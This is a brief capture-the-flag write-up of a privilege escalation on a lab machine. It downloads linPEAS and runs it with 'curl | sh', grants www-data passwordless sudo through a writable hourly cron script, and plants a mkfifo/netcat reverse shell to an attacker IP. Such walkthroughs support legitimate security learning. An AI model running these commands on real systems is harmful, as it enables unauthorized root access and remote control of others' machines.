# 9f1f16_privilege_escalation_2

run [linpease](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) enumeration to get information about the system
```
# kali machine
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000

# target machine, 10.0.2.197
wget http://192.168.0.7:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh > linpeas_result.txt

# there is another way to execute linpeas.sh
python3 -m http.server 8000 # kali machine
curl http://192.168.0.7:8000/linpeas.sh | sh # target machine


# get the linpeas_result.txt file
# target machine
python3 -m http.server 8000

# kali machine
wget http://10.0.2.197:8000/linpeas_result.txt
```


After analyzing the linpeas_result.txt, we find that the cron job is misconfigured.

`/etc/cron.hourly/cuiteur-cleaning` is free to edit by ```www-data```, let's edit it and add a reverse shell to it.
```
# the first method
echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

sudo bash # when saved, after 1 miniute, execute this command
find / -name "flag*" 2>/dev/null
/root/flag{9f1f16bf09920a5993c7d9f6674306a3f36d0cf8c29d30}.jpg


# the second method
/bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl|/bin/bash -i 2>&1 | nc 192.168.0.7 4444 >/tmp/tfl


nc -lvp 4444 # kali machine

```
